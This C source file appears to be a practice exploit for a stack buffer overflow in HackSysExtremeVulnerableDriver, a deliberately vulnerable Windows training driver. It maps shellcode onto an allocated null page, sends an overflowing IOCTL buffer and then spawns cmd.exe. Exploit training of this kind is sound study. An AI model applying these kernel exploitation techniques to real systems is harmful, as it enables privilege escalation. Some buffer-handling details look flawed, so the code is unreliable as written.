#include "Includes.h"

int main(int argc, char** argv)
{
	printf("[>] Exploit written by uncodable (7/20/2021)\n[>] Exploit -> HackSysExtremeVulnerableDriver, Stack-based Buffer Overflow x64\n[>] Let's exploit!\n");

	HANDLE driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (check(driver))
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (setup(driver))
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	if (exploit(driver))
	{
		printf("[-] Exploit failed.");
		return 1;
	}

	printf("[+] Exploit completely successfully!");
	unused = getchar();

	return 0;
}

int check(HANDLE handle)
{
	if (handle == (HANDLE)-1)
	{
		printf("[-] Unable to obtain a handle. GetLastError: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a driver handle.\n");

	return 0;
}

int setup(HANDLE handle)
{
	HANDLE ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (ntdll == (HANDLE)-1)
	{
		printf("[-] Unable to load ntdll.dll.");
		unused = getchar();
		return 1;
	}
	printf("[+] Loaded ntdll.dll. Handle: 0x%p\n", ntdll);

	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	if (!_ZwAllocateVirtualMemory)
	{
		printf("Failed to locate ZwAllocateVirtualMemory.");
		unused = getchar();
		return 1;
	}
	printf("[+] Located ZwAllocateVirtualMemory. Address: 0x%p\n", GetProcAddress(ntdll, "ZwAllocateVirtualMemory"));

	PVOID baseAddress = 1;
	SIZE_T regionSize = 4096;
	NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status)
	{
		printf("[-] Failed to allocate null page. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	printf("[+] Allocated null page. NTSTATUS: %d (0x%x)\n", status, status);

	memcpy((unsigned long long*)0x0000000000000100, &shellcode, sizeof(shellcode));
	printf("[+] Mapped shellcode onto the null page.\n");

	memset(&inBuffer, 'A', 2072);
	strcpy_s(&inBuffer, 8, &rip);
	printf("[+] Crafted input buffer. Buffer length: %d (0x%x)\n", sizeof(inBuffer), sizeof(inBuffer));

	return 0;
}

int exploit(HANDLE handle)
{
	printf("[!] Overflowing the stack buffer in three...");
	Sleep(1000);
	printf("\n[!!] Two...");
	Sleep(1000);
	printf("\n[!!!] One...");
	Sleep(1000);
	printf("\n[*] GO!\n");
	Sleep(100);

	DeviceIoControl(handle, 0x222003, &inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, 0);

	Sleep(1000);
	system("start C:\\Windows\\System32\\cmd.exe");

	return 0;
}